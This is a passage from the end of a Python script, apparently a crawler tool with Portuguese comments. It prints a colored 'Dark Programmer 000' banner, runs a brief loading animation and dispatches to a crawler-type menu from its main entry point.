    print("\033[01;30m =-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-== \033[01;37m")
    print("\033[01;30m =-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-== \033[01;37m")
    print("\033[01;32m +                    Dark Programmer 000                    + \033[01;37m")
    print("\033[01;30m =-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-== \033[01;37m")
    print("\033[01;30m =-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-== \033[01;37m")
    print("")

    done = False
    t = threading.Thread(target=animate)
    t.start()

    # Processamento
    time.sleep(1)
    done = True

    # Chamada de metodos: Tipos de crawlers aglomerado ao MENU
    Crawler_types(Menu())

# Execucao do metodo principal
if __name__ == '__main__':

    try:
        # Chamada de metodos: Configuracoes do sistema
        Sistema()

        # Chamada de metodo principal
        Main()

    except:
        pass
